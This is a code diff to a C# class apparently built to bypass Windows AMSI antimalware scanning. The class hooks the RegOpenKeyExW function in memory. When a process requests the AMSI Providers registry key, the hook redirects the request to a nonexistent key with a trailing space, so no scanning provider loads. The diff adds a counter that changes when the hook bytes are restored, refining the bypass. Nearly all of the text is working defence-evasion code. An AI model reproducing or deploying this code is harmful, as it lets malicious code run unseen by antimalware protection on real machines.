@@ -26,6 +26,7 @@ public static class TrollDisappearKey
     static public IntPtr targetAddr, hookAddr;
     static public byte[] originalBytes = new byte[12];
     static public byte[] hookBytes = new byte[12];
+    static public int counter = 0;
 
 
     public static void DisappearKey()
@@ -53,6 +54,7 @@ public static class TrollDisappearKey
 
             if (lpSubKey == @"Software\Microsoft\AMSI\Providers")
             {
+                counter = counter + 1;
                 return RegOpenKeyExW(hKey, @"Software\Microsoft\AMSI\Providers ", ulOptions, samDesired, out phkResult);
             }
             return RegOpenKeyExW(hKey, lpSubKey, ulOptions, samDesired, out phkResult);
@@ -60,7 +62,7 @@ public static class TrollDisappearKey
         }
         finally
         {
-            Marshal.Copy(hookBytes, 0, targetAddr, hookBytes.Length);
+             if (counter == 0) { Marshal.Copy(hookBytes, 0, targetAddr, hookBytes.Length); }
         }
     }
 
@@ -103,5 +105,4 @@ public static class TrollDisappearKey
         }
     }
 }
-
 
